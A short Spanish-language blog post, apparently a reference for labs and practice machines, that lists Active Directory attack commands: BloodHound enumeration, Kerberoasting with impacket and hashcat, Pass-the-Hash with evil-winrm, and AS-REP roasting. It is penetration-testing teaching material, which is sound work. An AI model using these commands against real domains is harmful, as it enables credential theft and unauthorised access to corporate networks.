---
title: "Active Directory 101: enumeración y ataques comunes"
excerpt: "Kerberoasting, Pass-the-Hash, BloodHound... guía de referencia para labs y máquinas de AD."
category: Técnico
---

Active Directory aparece en prácticamente todos los entornos corporativos reales. Entenderlo es indispensable.

## Enumeración inicial

Con credenciales válidas podemos usar **BloodHound** para mapear el dominio:

```bash
bloodhound-python -u usuario -p password -d dominio.local -ns IP_DC
```

## Ataques comunes

### Kerberoasting

Solicitar tickets TGS para cuentas con SPN y crackearlos offline:

```bash
impacket-GetUserSPNs dominio.local/usuario:password -dc-ip IP -request
hashcat -m 13100 hashes.txt rockyou.txt
```

### Pass-the-Hash

Si tenemos el hash NTLM de un administrador local:

```bash
evil-winrm -i IP -u Administrator -H NTLM_HASH
```

### AS-REP Roasting

Para cuentas sin pre-autenticación Kerberos:

```bash
impacket-GetNPUsers dominio.local/ -usersfile users.txt -dc-ip IP
```

---

> AD es un mundo enorme. Esta guía es solo la superficie — cada ataque tiene sus variantes y contramedidas.
